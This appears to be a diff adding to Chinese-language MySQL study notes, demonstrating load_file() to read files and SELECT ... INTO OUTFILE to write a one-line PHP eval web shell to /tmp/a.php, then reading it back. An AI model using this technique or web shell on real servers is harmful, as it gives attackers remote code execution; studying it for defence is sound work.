@@ -77,3 +77,31 @@ mysql> select * from book order by 3;			--对第三个字段price进行排列
 |  1 | HerryPoter |    32 |
 |  4 | okfoll     |    54 |
 +----+------------+-------+
+
+
+关于load_file()
+=========================================================
+mysql> select load_file("/tmp/test");
+
++------------------------+
+| load_file("/tmp/test") |
++------------------------+
+| hello world		 |
++------------------------+
+
+
+
+关于into outfile
+=========================================================
+mysql> select "<?php @eval($_POST['x']);?>" into outfile '/tmp/a.php';
+Query OK, 1 row affected (0.01 sec)
+
+mysql> select load_file("/tmp/a.php");
++------------------------------+
+| load_file("/tmp/a.php")      |
++------------------------------+
+| <?php @eval($_POST['x']);?>  |
++------------------------------+
+1 row in set (0.00 sec)
+
+
